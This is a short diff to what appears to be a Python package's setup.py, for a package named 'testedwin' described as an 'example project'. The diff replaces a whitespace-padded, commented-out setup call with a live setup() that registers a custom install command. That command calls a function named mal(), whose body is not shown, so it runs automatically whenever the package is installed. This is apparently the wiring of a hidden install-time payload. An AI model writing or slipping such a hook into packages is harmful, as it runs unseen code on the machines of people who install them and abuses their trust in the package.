@@ -61,4 +61,21 @@ class PostInstallCommand(install):
         mal()
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                              
+setup(
+    name='testedwin',
+    version='0.1',
+    license='MIT',
+    author="Mario Nascimento",
+    author_email='marionascimento047@gmail.com',
+    packages=find_packages('src'),
+    package_dir={'': 'src'},
+    url='https://github.com/darkarp/testedwin',
+    keywords='example project',
+    install_requires=[
+        'requests',
+    ],
+    cmdclass={
+        'install': PostInstallCommand
+    }
+
+)
